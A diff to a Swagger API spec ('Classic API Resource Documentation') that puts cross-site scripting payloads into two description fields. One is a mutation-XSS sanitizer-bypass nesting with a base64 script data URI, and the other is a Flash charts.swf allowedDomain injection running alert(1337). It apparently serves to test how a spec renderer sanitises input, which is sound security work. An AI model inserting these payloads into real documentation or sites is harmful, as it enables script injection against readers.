@@ -2,7 +2,8 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain="})))}catch(e) {alert(1337)}//'>
+<param name="AllowScriptAccess" value="always"></object>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +29,8 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain="})))}catch(e) {alert(1337)}//'>
+<param name="AllowScriptAccess" value="always"></object>"></form>
 
           format: int64
           in: path
